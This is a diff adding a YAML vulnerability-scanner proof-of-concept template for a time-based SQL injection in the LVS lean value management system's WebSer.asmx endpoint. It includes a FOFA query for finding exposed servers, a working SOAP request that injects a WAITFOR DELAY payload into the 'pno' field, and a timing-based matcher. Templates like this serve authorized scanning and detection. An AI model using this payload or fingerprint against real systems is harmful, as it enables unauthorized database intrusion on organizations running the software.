@@ -1,0 +1,28 @@
+id: poc-yaml-ji-la-ke-ji-lvs-webser-asmx-sqli
+info:
+  name: LVS精益价值管理系统 WebSer.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: LVS精益价值管理系统
+  fofa: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /WebSer.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/OutStore
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Header>\n    <AuthenticationHeader xmlns=\"http://tempuri.org/\">\n\
+    \      <UserName></UserName>\n      <Password></Password>\n    </AuthenticationHeader>\n\
+    \  </soap:Header>\n  <soap:Body>\n    <OutStore xmlns=\"http://tempuri.org/\"\
+    >\n      <pno>1';WAITFOR DELAY '0:0:{{.t1}}'--</pno>\n    </OutStore>\n  </soap:Body>\n\
+    </soap:Envelope>"
+  expression: "status_code == 500 && \ncontains(body,\"LVS.Web.SQL\") &&\ncontains(body,\"\
+    System.Web.Services.Protocols.SoapException\") &&\ncontains(content_type,\"text/xml\"\
+    ) &&\nduration > t1 &&\nduration < t2\n"
+transport: http
